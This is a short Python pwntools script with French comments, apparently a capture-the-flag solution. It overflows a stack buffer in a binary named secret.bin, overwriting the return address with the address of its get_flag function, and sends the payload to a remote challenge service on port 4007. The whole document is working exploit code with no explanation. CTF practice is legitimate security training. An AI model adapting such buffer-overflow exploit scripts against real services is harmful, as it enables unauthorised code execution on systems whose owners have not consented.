from pwn import *
import time

# Charger le binaire (si disponible pour les symboles)
elf = context.binary = ELF('./secret.bin')

# Adresse de la fonction get_flag
get_flag_addr = elf.symbols['get_flag']

# Offset pour écraser l'adresse de retour
offset = 42

# Construction du payload
payload = b'A' * offset + p32(get_flag_addr)

print(f"[DEBUG] Payload: {payload}")

# Connexion au service distant
p = remote('amsi-sorbonne.fr', 4007)

# Activer les logs pour debugging
context.log_level = 'debug'

# p.interactive()


# Lire la sortie complète
print("\n" + p.recv(76).decode(errors="ignore"))

time.sleep(1)

# p.interactive()

# Envoyer le payload (remplacez par send() si nécessaire)
p.sendline(payload)

# p.sendline("hello")

try:
    response = p.recvall().decode()  # Lire jusqu'à 30 octets, ajustez si nécessaire
    print(response)
except EOFError:
    print("[!] Le processus s'est terminé prématurément.")
    print(p.recvall().decode())  # Récupère tout ce qui est disponible avant l'EOF


# Lire la sortie complète
# print("\n" + p.recvall(timeout=2).decode(errors="ignore"))

# Fermez la connexion
# p.close()
